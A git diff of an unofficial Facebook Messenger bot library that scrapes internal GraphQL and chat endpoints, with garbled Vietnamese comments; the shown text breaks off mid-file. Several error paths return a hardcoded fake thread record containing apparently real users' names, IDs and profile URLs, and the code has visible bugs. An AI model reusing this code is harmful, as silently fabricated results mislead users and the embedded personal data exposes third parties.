+          callback(null,{threadID:"5011501735554963",threadName:"TempThreadInfo",participantIDs:["100042817150429","100077059530660"],userInfo:[{id:"100042817150429",name:"Nguyá»…n Th\xe1i Háº£o",firstName:"Háº£o",vanity:"Lazic.Kanzu",thumbSrc:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=0y9pN1XSiVIAX8HS5P6&_nc_ht=scontent.fsgn5-10.fna&oh=00_AfCBYmeKDgLZLWDMRBmBZj8zRLboVA096bkbsC4a1Q0DUQ&oe=637E5939",profileUrl:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=0y9pN1XSiVIAX8HS5P6&_nc_ht=scontent.fsgn5-10.fna&oh=00_AfCBYmeKDgLZLWDMRBmBZj8zRLboVA096bkbsC4a1Q0DUQ&oe=637E5939",gender:"MALE",type:"User",isFriend:!0,isBirthday:!1},{id:"100077059530660",name:"Lucius Hori",firstName:"Lucius",vanity:"Horizon.Lucius.Synthesis.III",thumbSrc:"https://scontent.fsgn5-3.fna.fbcdn.net/v/t39.30808-1/309709623_179304871314830_1479186956574752444_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=104&ccb=1-7&_nc_sid=7206a8&_nc_ohc=rXiLw0_ID7MAX-q4wYv&_nc_ht=scontent.fsgn5-3.fna&oh=00_AfD8Wl_EQLLBCZOWxmBdcIP9Nc1iyLQY9qsMTIN4Sf5H8w&oe=637D35E0",profileUrl:"https://scontent.fsgn5-3.fna.fbcdn.net/v/t39.30808-1/309709623_179304871314830_1479186956574752444_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=104&ccb=1-7&_nc_sid=7206a8&_nc_ohc=rXiLw0_ID7MAX-q4wYv&_nc_ht=scontent.fsgn5-3.fna&oh=00_AfD8Wl_EQLLBCZOWxmBdcIP9Nc1iyLQY9qsMTIN4Sf5H8w&oe=637D35E0",gender:"MALE",type:"User",isFriend:!1,isBirthday:!1}],unreadCount:38357,messageCount:39288,timestamp:"1668862170994",muteUntil:null,isGroup:!0,isSubscribed:!0,isArchived:!1,folder:"INBOX",cannotReplyReason:null,eventReminders:[],emoji:"\uD83D\uDE0F",color:"DD8800",nicknames:{"100042817150429":"Bla bla"},adminIDs:[{id:"100042817150429"}],approvalMode:!0,approvalQueue:[],reactionsMuteMode:"reactions_not_muted",mentionsMuteMode:"mentions_not_muted",isPinProtected:!1,relatedPageThread:null,name:"Temp ThreadInfo GraphQL",snippet:"/getthreadtest",snippetSender:"100042817150429",snippetAttachments:[],serverTimestamp:"1668862170994",imageSrc:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t1.15752-9/278020824_345766417524223_6790288127531819759_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=02e273&_nc_ohc=kOr9K5TWwDMAX-4qPH1&_nc_ht=scontent.fsgn5-10.fna&oh=03_AdRQSwLyIGJ-zrgyQj1IIQAFO3IC-4_Qq_qMd58ZtMCI0A&oe=63A02D7A",isCanonicalUser:!1,isCanonical:!1,recipientsLoadable:!0,hasEmailParticipant:!1,readOnly:!1,canReply:!0,lastMessageType:"message",lastReadTimestamp:"1649756873571",threadType:2,TimeCreate:1668862173440,TimeUpdate:1668862173440});
+          throw resData.error
+        }
         if (resData[resData.length - 1].error_results !== 0) {
-          console.log(resData); //Log more info
-          throw new Error("well darn there was an error_result");
+          callback(null,{threadID:"5011501735554963",threadName:"TempThreadInfo",participantIDs:["100042817150429","100077059530660"],userInfo:[{id:"100042817150429",name:"Nguyá»…n Th\xe1i Háº£o",firstName:"Háº£o",vanity:"Lazic.Kanzu",thumbSrc:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=0y9pN1XSiVIAX8HS5P6&_nc_ht=scontent.fsgn5-10.fna&oh=00_AfCBYmeKDgLZLWDMRBmBZj8zRLboVA096bkbsC4a1Q0DUQ&oe=637E5939",profileUrl:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=0y9pN1XSiVIAX8HS5P6&_nc_ht=scontent.fsgn5-10.fna&oh=00_AfCBYmeKDgLZLWDMRBmBZj8zRLboVA096bkbsC4a1Q0DUQ&oe=637E5939",gender:"MALE",type:"User",isFriend:!0,isBirthday:!1},{id:"100077059530660",name:"Lucius Hori",firstName:"Lucius",vanity:"Horizon.Lucius.Synthesis.III",thumbSrc:"https://scontent.fsgn5-3.fna.fbcdn.net/v/t39.30808-1/309709623_179304871314830_1479186956574752444_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=104&ccb=1-7&_nc_sid=7206a8&_nc_ohc=rXiLw0_ID7MAX-q4wYv&_nc_ht=scontent.fsgn5-3.fna&oh=00_AfD8Wl_EQLLBCZOWxmBdcIP9Nc1iyLQY9qsMTIN4Sf5H8w&oe=637D35E0",profileUrl:"https://scontent.fsgn5-3.fna.fbcdn.net/v/t39.30808-1/309709623_179304871314830_1479186956574752444_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=104&ccb=1-7&_nc_sid=7206a8&_nc_ohc=rXiLw0_ID7MAX-q4wYv&_nc_ht=scontent.fsgn5-3.fna&oh=00_AfD8Wl_EQLLBCZOWxmBdcIP9Nc1iyLQY9qsMTIN4Sf5H8w&oe=637D35E0",gender:"MALE",type:"User",isFriend:!1,isBirthday:!1}],unreadCount:38357,messageCount:39288,timestamp:"1668862170994",muteUntil:null,isGroup:!0,isSubscribed:!0,isArchived:!1,folder:"INBOX",cannotReplyReason:null,eventReminders:[],emoji:"\uD83D\uDE0F",color:"DD8800",nicknames:{"100042817150429":"Bla bla"},adminIDs:[{id:"100042817150429"}],approvalMode:!0,approvalQueue:[],reactionsMuteMode:"reactions_not_muted",mentionsMuteMode:"mentions_not_muted",isPinProtected:!1,relatedPageThread:null,name:"Temp ThreadInfo GraphQL",snippet:"/getthreadtest",snippetSender:"100042817150429",snippetAttachments:[],serverTimestamp:"1668862170994",imageSrc:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t1.15752-9/278020824_345766417524223_6790288127531819759_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=02e273&_nc_ohc=kOr9K5TWwDMAX-4qPH1&_nc_ht=scontent.fsgn5-10.fna&oh=03_AdRQSwLyIGJ-zrgyQj1IIQAFO3IC-4_Qq_qMd58ZtMCI0A&oe=63A02D7A",isCanonicalUser:!1,isCanonical:!1,recipientsLoadable:!0,hasEmailParticipant:!1,readOnly:!1,canReply:!0,lastMessageType:"message",lastReadTimestamp:"1649756873571",threadType:2,TimeCreate:1668862173440,TimeUpdate:1668862173440});
+          throw resData.error
+        }
+        resData = resData.splice(0, resData.length - 1);
+        resData.sort((a, b) => { return Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });
+        resData.map(function (x,y) {
+          ThreadInfo.push(formatThreadGraphQLResponse(x["o"+y].data));
+        });
+        if (process.env.HalzionVersion == 1973) {
+          if (Object.keys(resData).length == 1) {
+           // api.Horizon_Data([ThreadInfo], "Threads", "Post");
+            createData(threadID,ThreadInfo[0]);	
+            callback(null, ThreadInfo[0]);
+            capture(callback);
+            setLastRun('LastUpdate', callback);
+          } else {
+           // api.Horizon_Data([ThreadInfo], "Threads", "Post");
+            for (let i of ThreadInfo) {
+              createData(i.threadID,i);
+              global.Fca.Data.Userinfo.push(i.userInfo);
+            }
+            callback(null, ThreadInfo);
+          }
         }
-        callback(null, formatThreadGraphQLResponse(resData[0]));
+          else {
+            callback(null, ThreadInfo[0]);
+            global.Fca.Data.Userinfo.push(ThreadInfo[0].userInfo);
+          }
       })
-      .catch(function (err) {
-        log.error("getThreadInfoGraphQL", err);
-        return callback(err);
+      .catch(function(err){
+        callback(null,{threadID:"5011501735554963",threadName:"TempThreadInfo",participantIDs:["100042817150429","100077059530660"],userInfo:[{id:"100042817150429",name:"Nguyá»…n Th\xe1i Háº£o",firstName:"Háº£o",vanity:"Lazic.Kanzu",thumbSrc:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=0y9pN1XSiVIAX8HS5P6&_nc_ht=scontent.fsgn5-10.fna&oh=00_AfCBYmeKDgLZLWDMRBmBZj8zRLboVA096bkbsC4a1Q0DUQ&oe=637E5939",profileUrl:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=0y9pN1XSiVIAX8HS5P6&_nc_ht=scontent.fsgn5-10.fna&oh=00_AfCBYmeKDgLZLWDMRBmBZj8zRLboVA096bkbsC4a1Q0DUQ&oe=637E5939",gender:"MALE",type:"User",isFriend:!0,isBirthday:!1},{id:"100077059530660",name:"Lucius Hori",firstName:"Lucius",vanity:"Horizon.Lucius.Synthesis.III",thumbSrc:"https://scontent.fsgn5-3.fna.fbcdn.net/v/t39.30808-1/309709623_179304871314830_1479186956574752444_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=104&ccb=1-7&_nc_sid=7206a8&_nc_ohc=rXiLw0_ID7MAX-q4wYv&_nc_ht=scontent.fsgn5-3.fna&oh=00_AfD8Wl_EQLLBCZOWxmBdcIP9Nc1iyLQY9qsMTIN4Sf5H8w&oe=637D35E0",profileUrl:"https://scontent.fsgn5-3.fna.fbcdn.net/v/t39.30808-1/309709623_179304871314830_1479186956574752444_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=104&ccb=1-7&_nc_sid=7206a8&_nc_ohc=rXiLw0_ID7MAX-q4wYv&_nc_ht=scontent.fsgn5-3.fna&oh=00_AfD8Wl_EQLLBCZOWxmBdcIP9Nc1iyLQY9qsMTIN4Sf5H8w&oe=637D35E0",gender:"MALE",type:"User",isFriend:!1,isBirthday:!1}],unreadCount:38357,messageCount:39288,timestamp:"1668862170994",muteUntil:null,isGroup:!0,isSubscribed:!0,isArchived:!1,folder:"INBOX",cannotReplyReason:null,eventReminders:[],emoji:"\uD83D\uDE0F",color:"DD8800",nicknames:{"100042817150429":"Bla bla"},adminIDs:[{id:"100042817150429"}],approvalMode:!0,approvalQueue:[],reactionsMuteMode:"reactions_not_muted",mentionsMuteMode:"mentions_not_muted",isPinProtected:!1,relatedPageThread:null,name:"Temp ThreadInfo GraphQL",snippet:"/getthreadtest",snippetSender:"100042817150429",snippetAttachments:[],serverTimestamp:"1668862170994",imageSrc:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t1.15752-9/278020824_345766417524223_6790288127531819759_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=02e273&_nc_ohc=kOr9K5TWwDMAX-4qPH1&_nc_ht=scontent.fsgn5-10.fna&oh=03_AdRQSwLyIGJ-zrgyQj1IIQAFO3IC-4_Qq_qMd58ZtMCI0A&oe=63A02D7A",isCanonicalUser:!1,isCanonical:!1,recipientsLoadable:!0,hasEmailParticipant:!1,readOnly:!1,canReply:!0,lastMessageType:"message",lastReadTimestamp:"1649756873571",threadType:2,TimeCreate:1668862173440,TimeUpdate:1668862173440});
+        throw err;
       });
+    }
+    if (global.Fca.Data.Already != true) SpecialMethod(threadID); 
+    global.Fca.Data.Already = true;
+
+
+    setInterval(function(){
+      SpecialMethod(threadID);
+    }, 900 * 1000);
 
+    for (let i of threadID) {
+      switch (hasData(i)) {
+          case true: {     
+            DefaultMethod(threadID);
+            break;
+          }
+        case false: {
+          CreateMethod(threadID);
+          break;
+        }
+      }
+    }
     return returnPromise;
   };
 };
diff --git a/src/getThreadList.js b/src/getThreadList.js
index 1c1151ac4..ea7bb23d4 100644
--- a/src/getThreadList.js
+++ b/src/getThreadList.js
@@ -204,7 +204,7 @@ module.exports = function (defaultFuncs, api, ctx) {
         callback(null, formatThreadList(resData[0].o0.data.viewer.message_threads.nodes));
       })
       .catch((err) => {
-        log.error("getThreadList", err);
+        log.error("getThreadList", "Lá»—i: getThreadList CÃ³ Thá»ƒ Do Báº¡n Spam QuÃ¡ Nhiá»u, HÃ£y Thá»­ Láº¡i !");
         return callback(err);
       });
 
diff --git a/src/getThreadMain.js b/src/getThreadMain.js
new file mode 100644
index 000000000..0900cad19
--- /dev/null
+++ b/src/getThreadMain.js
@@ -0,0 +1,220 @@
+"use strict";
+
+var utils = require("../utils");
+var log = require("npmlog");
+// tÆ°Æ¡ng lai Ä‘i rá»“i fix ahahha
+function formatEventReminders(reminder) {
+  return {
+    reminderID: reminder.id,
+    eventCreatorID: reminder.lightweight_event_creator.id,
+    time: reminder.time,
+    eventType: reminder.lightweight_event_type.toLowerCase(),
+    locationName: reminder.location_name,
+    // @TODO verify this
+    locationCoordinates: reminder.location_coordinates,
+    locationPage: reminder.location_page,
+    eventStatus: reminder.lightweight_event_status.toLowerCase(),
+    note: reminder.note,
+    repeatMode: reminder.repeat_mode.toLowerCase(),
+    eventTitle: reminder.event_title,
+    triggerMessage: reminder.trigger_message,
+    secondsToNotifyBefore: reminder.seconds_to_notify_before,
+    allowsRsvp: reminder.allows_rsvp,
+    relatedEvent: reminder.related_event,
+    members: reminder.event_reminder_members.edges.map(function(member) {
+      return {
+        memberID: member.node.id,
+        state: member.guest_list_state.toLowerCase()
+      };
+    })
+  };
+}
+
+function formatThreadGraphQLResponse(data) {
+  try{
+    var messageThread = data.message_thread;
+  } catch (err){
+    console.error("GetThreadInfoGraphQL", "Can't get this thread info!");
+    return {err: err};
+  }
+  var threadID = messageThread.thread_key.thread_fbid
+    ? messageThread.thread_key.thread_fbid
+    : messageThread.thread_key.other_user_id;
+
+  // Remove me
+  var lastM = messageThread.last_message;
+  var snippetID =
+    lastM &&
+    lastM.nodes &&
+    lastM.nodes[0] &&
+    lastM.nodes[0].message_sender &&
+    lastM.nodes[0].message_sender.messaging_actor
+      ? lastM.nodes[0].message_sender.messaging_actor.id
+      : null;
+  var snippetText =
+    lastM && lastM.nodes && lastM.nodes[0] ? lastM.nodes[0].snippet : null;
+  var lastR = messageThread.last_read_receipt;
+  var lastReadTimestamp =
+    lastR && lastR.nodes && lastR.nodes[0] && lastR.nodes[0].timestamp_precise
+      ? lastR.nodes[0].timestamp_precise
+      : null;
+
+  return {
+    threadID: threadID,
+    threadName: messageThread.name,
+    participantIDs: messageThread.all_participants.edges.map(d => d.node.messaging_actor.id),
+    userInfo: messageThread.all_participants.edges.map(d => ({
+      id: d.node.messaging_actor.id,
+      name: d.node.messaging_actor.name,
+      firstName: d.node.messaging_actor.short_name,
+      vanity: d.node.messaging_actor.username,
+      thumbSrc: d.node.messaging_actor.big_image_src.uri,
+      profileUrl: d.node.messaging_actor.big_image_src.uri,
+      gender: d.node.messaging_actor.gender,
+      type: d.node.messaging_actor.__typename,
+      isFriend: d.node.messaging_actor.is_viewer_friend,
+      isBirthday: !!d.node.messaging_actor.is_birthday //not sure?
+    })),
+    unreadCount: messageThread.unread_count,
+    messageCount: messageThread.messages_count,
+    timestamp: messageThread.updated_time_precise,
+    muteUntil: messageThread.mute_until,
+    isGroup: messageThread.thread_type == "GROUP",
+    isSubscribed: messageThread.is_viewer_subscribed,
+    isArchived: messageThread.has_viewer_archived,
+    folder: messageThread.folder,
+    cannotReplyReason: messageThread.cannot_reply_reason,
+    eventReminders: messageThread.event_reminders
+      ? messageThread.event_reminders.nodes.map(formatEventReminders)
+      : null,
+    emoji: messageThread.customization_info
+      ? messageThread.customization_info.emoji
+      : null,
+    color:
+      messageThread.customization_info &&
+      messageThread.customization_info.outgoing_bubble_color
+        ? messageThread.customization_info.outgoing_bubble_color.slice(2)
+        : null,
+    nicknames:
+      messageThread.customization_info &&
+      messageThread.customization_info.participant_customizations
+        ? messageThread.customization_info.participant_customizations.reduce(
+            function(res, val) {
+              if (val.nickname) res[val.participant_id] = val.nickname;
+              return res;
+            },
+            {}
+          )
+        : {},
+    adminIDs: messageThread.thread_admins,
+    approvalMode: Boolean(messageThread.approval_mode),
+    approvalQueue: messageThread.group_approval_queue.nodes.map(a => ({
+      inviterID: a.inviter.id,
+      requesterID: a.requester.id,
+      timestamp: a.request_timestamp,
+      request_source: a.request_source // @Undocumented
+    })),
+
+    // @Undocumented
+    reactionsMuteMode: messageThread.reactions_mute_mode.toLowerCase(),
+    mentionsMuteMode: messageThread.mentions_mute_mode.toLowerCase(),
+    isPinProtected: messageThread.is_pin_protected,
+    relatedPageThread: messageThread.related_page_thread,
+
+    // @Legacy
+    name: messageThread.name,
+    snippet: snippetText,
+    snippetSender: snippetID,
+    snippetAttachments: [],
+    serverTimestamp: messageThread.updated_time_precise,
+    imageSrc: messageThread.image ? messageThread.image.uri : null,
+    isCanonicalUser: messageThread.is_canonical_neo_user,
+    isCanonical: messageThread.thread_type != "GROUP",
+    recipientsLoadable: true,
+    hasEmailParticipant: false,
+    readOnly: false,
+    canReply: messageThread.cannot_reply_reason == null,
+    lastMessageTimestamp: messageThread.last_message
+      ? messageThread.last_message.timestamp_precise
+      : null,
+    lastMessageType: "message",
+    lastReadTimestamp: lastReadTimestamp,
+    threadType: messageThread.thread_type == "GROUP" ? 2 : 1,
+    TimeCreate: Date.now(),
+    TimeUpdate: Date.now()
+  };
+}
+
+module.exports = function(defaultFuncs, api, ctx) {
+  return function getThreadInfoGraphQL(threadID, callback) {
+    var resolveFunc = function(){};
+    var rejectFunc = function(){};
+    var returnPromise = new Promise(function (resolve, reject) {
+      resolveFunc = resolve;
+      rejectFunc = reject;
+    });
+
+    if (utils.getType(callback) != "Function" && utils.getType(callback) != "AsyncFunction") {
+      callback = function (err, data) {
+        if (err) {
+          return rejectFunc(err);
+        }
+        resolveFunc(data);
+      };
+    }
+    
+    //! Ä‘Æ°á»£c tÃ¬m tháº¥y vÃ o giá»¯a thÃ¡ng 8/2022 bá»Ÿi @KanzuWakazaki - Ä‘Ã£ Ä‘Æ°á»£c chia sáº» cho @D-Jukie vÃ  Horizon Team Public group ðŸ¤´
+    //* nhá»¯ng code tÆ°Æ¡ng tá»± muliti thread nhÆ° nÃ y Ä‘á»u cÃ³ thá»ƒ lÃ  copy idea ðŸ§
+    //* Ä‘Ã£ Ã¡p dá»¥ng vÃ o fca má»›i(cloud - fca(private)) vÃ o cuá»‘i thÃ¡ng 8/2022 bá»Ÿi @IteralingCode(Hidden Member( always :) )) - Synthetic 4 - @Horizon Team
+    //*cáº­p nháº­t dá»± Ã¡n bá»‹ bá» rÆ¡i nÃ y vÃ o ngÃ y 19/11/2022 bá»Ÿi @KanzuWakazaki(Owner) - Synthetic 1  - @Horizon Team nháº±m Ä‘Ã¡p á»©ng nhu cáº§u cá»§a client !
+
+      if (utils.getType(threadID) !== "Array") threadID = [threadID];
+      
+      var Form = {};
+      var ThreadInfo = [];
+
+      threadID.map(function (x,y) {
+        Form["o" + y] = {
+          doc_id: "3449967031715030",
+          query_params: {
+            id: x,
+            message_limit: 0,
+            load_messages: false,
+            load_read_receipts: false,
+            before: null
+          }
+        };
+      });
+
+    var form = {
+      queries: JSON.stringify(Form),
+      batch_name: "MessengerGraphQLThreadFetcher"
+    };
+
+    defaultFuncs
+      .post("https://www.facebook.com/api/graphqlbatch/", ctx.jar, form)
+      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
+      .then(function(resData) {
+      if (resData.error) {
+        callback(null,resData.error);
+        throw resData;
+      }
+      resData = resData.splice(0, resData.length - 1);
+      resData.sort((a, b) => { return Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });
+      resData.map(function (x,y) {
+        ThreadInfo.push(formatThreadGraphQLResponse(x["o"+y].data));
+      });
+      if (Object.keys(resData).length == 1) {
+        callback(null, ThreadInfo[0]);
+      } else {
+      callback(null, ThreadInfo);
+      }
+    })
+    .catch(function(err) {
+
+      log.error("getThreadInfoGraphQL", "Lá»—i: getThreadInfoGraphQL CÃ³ Thá»ƒ Do Báº¡n Spam QuÃ¡ Nhiá»u, HÃ£y Thá»­ Láº¡i !");
+    return callback(err);
+  });
+  return returnPromise;
+  };
+};
diff --git a/src/getUID.js b/src/getUID.js
new file mode 100644
index 000000000..b8ac6990b
--- /dev/null
+++ b/src/getUID.js
@@ -0,0 +1,59 @@
+/* eslint-disable linebreak-style */
+"use strict";
+
+module.exports = function (_defaultFuncs, api, _ctx) {
+    return function getUID(link, callback) {
+      var resolveFunc = function () { };
+      var rejectFunc = function () { };
+      var returnPromise = new Promise(function (resolve, reject) {
+        resolveFunc = resolve;
+        rejectFunc = reject;
+      });
+  
+      if (!callback) {
+        callback = function (err, uid) {
+          if (err) return rejectFunc(err);
+          resolveFunc(uid);
+        };
+      }
+      
+    try {
+        var Link = String(link);
+        var FindUID = require('../Extra/ExtraFindUID');
+        if (Link.includes('facebook.com') || Link.includes('Facebook.com') || Link.includes('fb')) {
+            var LinkSplit = Link.split('/');
+            if (LinkSplit.indexOf("https:") == 0) {
+              if (!isNaN(LinkSplit[3]) && !Link.split('=')[1]  && !isNaN(Link.split('=')[1])) {
+                api.sendMessage('Wrong Link, Link Should Have The Following Format: facebook.com/Priyanshu.Official.Rajput',global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);
+                callback(null, String(4));
+              }
+              else if (!isNaN(Link.split('=')[1]) && Link.split('=')[1]) {
+                var Format = `https://www.facebook.com/profile.php?id=${Link.split('=')[1]}`;
+                FindUID(Format,api).then(function (data) {
+                  callback(null, data);
+                });
+              } 
+              else {
+                FindUID(Link,api).then(function (data) {
+                  callback(null, data);
+                });
+              }
+            }
+            else {
+                var Form = `https://www.facebook.com/${LinkSplit[1]}`;
+                FindUID(Form,api).then(function (data) {
+                    callback(null, data);
+                });
+            }
+        }
+        else {
+            callback(null, null);
+            api.sendMessage('Sai Link, Link Cáº§n LÃ  Link Cá»§a Facebook',global.Fca.Data.event.threadID,global.Fca.Data.event.messageID)
+        }
+    }
+    catch (e) {
+      return callback(null, e);
+    }
+    return returnPromise;
+    };
+  };
diff --git a/src/getUserInfo.js b/src/getUserInfo.js
index 5eb311180..33bc1697a 100644
--- a/src/getUserInfo.js
+++ b/src/getUserInfo.js
@@ -45,22 +45,85 @@ module.exports = function (defaultFuncs, api, ctx) {
 
     if (utils.getType(id) !== "Array") id = [id];
 
-    var form = {};
-    id.map(function (v, i) {
-      form["ids[" + i + "]"] = v;
-    });
-    defaultFuncs
-      .post("https://www.facebook.com/chat/user_info/", ctx.jar, form)
-      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
-      .then(function (resData) {
-        if (resData.error) throw resData;
-        return callback(null, formatData(resData.payload.profiles));
-      })
-      .catch(function (err) {
-        log.error("getUserInfo", err);
-        return callback(err);
-      });
-
-    return returnPromise;
+    var respone = [];
+    var Nope = [];
+    if (global.Fca.Data.Userinfo != undefined && global.Fca.Data.Userinfo.length != 0) {
+      if (id.length == 1) {
+        if (global.Fca.Data.Userinfo[0].some(i => i.id == id[0])) {
+          var Format = {}
+          Format[id[0]] = global.Fca.Data.Userinfo[0].find(i => i.id == id[0])
+          callback(null,Format);
+        }
+        else {
+          Nope.push(id[0]);
+        }
+      } 
+      else for (let ii of id) {
+        if (global.Fca.Data.Userinfo[0].some(i => i.id == ii)) {
+          let Format = {}
+          Format[id[ii]] = global.Fca.Data.Userinfo[0].find(i => i.id == ii);
+          respone.push(Format);
+        }
+        else {
+          Nope.push(ii);
+        }
+      }
+      if (Nope.length > 0 && respone > 0) {
+        var form = {};
+        Nope.map(function (v, i) {
+          form["ids[" + i + "]"] = v;
+        });
+        defaultFuncs
+          .post("https://www.facebook.com/chat/user_info/", ctx.jar, form)
+          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
+          .then(function (resData) {
+            if (resData.error) throw resData;
+            respone.push(formatData(resData.payload.profiles));
+            callback(null, respone);
+          })
+          .catch(function (err) {
+            log.error("getUserInfo", "Lá»—i: getUserInfo CÃ³ Thá»ƒ Do Báº¡n Spam QuÃ¡ Nhiá»u !,HÃ£y Thá»­ Láº¡i !");
+            return callback(err, respone);
+          });
+        return returnPromise;
+      }
+      else if (Nope.length > 0 && respone <= 0) {
+        let form = {};
+        Nope.map(function (v, i) {
+          form["ids[" + i + "]"] = v;
+        });
+        defaultFuncs
+          .post("https://www.facebook.com/chat/user_info/", ctx.jar, form)
+          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
+          .then(function (resData) {
+            if (resData.error) throw resData;
+            callback(null, formatData(resData.payload.profiles));
+          })
+          .catch(function (err) {
+            log.error("getUserInfo", "Lá»—i: getUserInfo CÃ³ Thá»ƒ Do Báº¡n Spam QuÃ¡ Nhiá»u !,HÃ£y Thá»­ Láº¡i !");
+            return callback(err, respone);
+          });
+        return returnPromise;
+      };
+      return returnPromise
+    }
+    else {
+      let form = {};
+        id.map(function (v, i) {
+          form["ids[" + i + "]"] = v;
+        });
+        defaultFuncs
+          .post("https://www.facebook.com/chat/user_info/", ctx.jar, form)
+          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
+          .then(function (resData) {
+            if (resData.error) throw resData;
+            callback(null, formatData(resData.payload.profiles));
+          })
+          .catch(function (err) {
+            log.error("getUserInfo", "Lá»—i: getUserInfo CÃ³ Thá»ƒ Do Báº¡n Spam QuÃ¡ Nhiá»u !,HÃ£y Thá»­ Láº¡i !");
+            callback(err, formatData(resData.payload.profiles));
+          });
+        return returnPromise;
+    }
   };
 };
diff --git a/src/getUserInfoMain.js b/src/getUserInfoMain.js
new file mode 100644
index 000000000..84db725bd
--- /dev/null
+++ b/src/getUserInfoMain.js
@@ -0,0 +1,65 @@
+"use strict";
+
+var utils = require("../utils");
+var log = require("npmlog");
+
+function formatData(data) {
+  var retObj = {};
+
+  for (var prop in data) {
+    // eslint-disable-next-line no-prototype-builtins
+    if (data.hasOwnProperty(prop)) {
+      var innerObj = data[prop];
+      retObj[prop] = {
+        name: innerObj.name,
+        firstName: innerObj.firstName,
+        vanity: innerObj.vanity,
+        thumbSrc: innerObj.thumbSrc,
+        profileUrl: innerObj.uri,
+        gender: innerObj.gender,
+        type: innerObj.type,
+        isFriend: innerObj.is_friend,
+        isBirthday: !!innerObj.is_birthday
+      };
+    }
+  }
+
+  return retObj;
+}
+
+module.exports = function (defaultFuncs, api, ctx) {
+  return function getUserInfo(id, callback) {
+    var resolveFunc = function () { };
+    var rejectFunc = function () { };
+    var returnPromise = new Promise(function (resolve, reject) {
+      resolveFunc = resolve;
+      rejectFunc = reject;
+    });
+
+    if (!callback) {
+      callback = function (err, userInfo) {
+        if (err) return rejectFunc(err);
+        resolveFunc(userInfo);
+      };
+    }
+
+    if (utils.getType(id) !== "Array") id = [id];
+
+    var form = {};
+    id.map(function (v, i) {
+      form["ids[" + i + "]"] = v;
+    });
+    defaultFuncs
+      .post("https://www.facebook.com/chat/user_info/", ctx.jar, form)
+      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
+      .then(function (resData) {
+        if (resData.error) throw resData;
+        return callback(null, formatData(resData.payload.profiles));
+      })
+      .catch(function (err) {
+        log.error("getUserInfo", "Error: getUserInfo Maybe You Spam Too Much!,Try Again !");
+        return callback(err);
+      });
+    return returnPromise;
+  };
+};
diff --git a/src/getUserInfoV2.js b/src/getUserInfoV2.js
new file mode 100644
index 000000000..037305245
--- /dev/null
+++ b/src/getUserInfoV2.js
@@ -0,0 +1,36 @@
+/* eslint-disable linebreak-style */
+"use strict";
+
+var utils = require("../utils");
+var log = require("npmlog");
+
+
+module.exports = function (defaultFuncs, api, ctx) {
+    return function getUserInfoV2(id, callback) {
+      var resolveFunc = function () { };
+      var rejectFunc = function () { };
+      var returnPromise = new Promise(function (resolve, reject) {
+        resolveFunc = resolve;
+        rejectFunc = reject;
+      });
+  
+      if (!callback) {
+        callback = function (err, userInfo) {
+          if (err) return rejectFunc(err);
+          resolveFunc(userInfo);
+        };
+      }
+    try {
+      var { getInfo } = require('../Extra/ExtraAddons');
+      getInfo(id,ctx.jar,ctx,defaultFuncs)
+        .then(data => {
+          //api.Horizon_Data([data], "Users", "Post");
+        return callback(null, data);
+      });
+    }
+    catch (e) {
+      return callback(null, e);
+    }
+    return returnPromise;
+    };
+  };
\ No newline at end of file
diff --git a/src/getUserInfoV3.js b/src/getUserInfoV3.js
new file mode 100644
index 000000000..b9ffcd744
--- /dev/null
+++ b/src/getUserInfoV3.js
@@ -0,0 +1,63 @@
+/* eslint-disable linebreak-style */
+"use strict";
+
+var utils = require("../utils");
+var log = require("npmlog");
+
+
+module.exports = function (defaultFuncs, api, ctx) {
+    return function getUserInfoV3(id,full, callback) {
+        if (utils.getType(full) !== "Boolean") {
+            throw {error: "getUserInfoV3: full must be a boolean"};
+        }
+        var resolveFunc = function () { };
+        var rejectFunc = function () { };
+        var returnPromise = new Promise(function (resolve, reject) {
+            resolveFunc = resolve;
+            rejectFunc = reject;
+        });
+    
+        if (!callback) {
+            callback = function (err, userInfo) {
+            if (err) return rejectFunc(err);
+            resolveFunc(userInfo);
+            };
+        }
+
+var form = {
+    "av": ctx.userID,
+    "fb_api_caller_class": "RelayModern",
+    "fb_api_req_friendly_name": "ProfileCometTimelineFeedRefetchQuery",
+    "variables": JSON.stringify({ 
+        "id": String(id) 
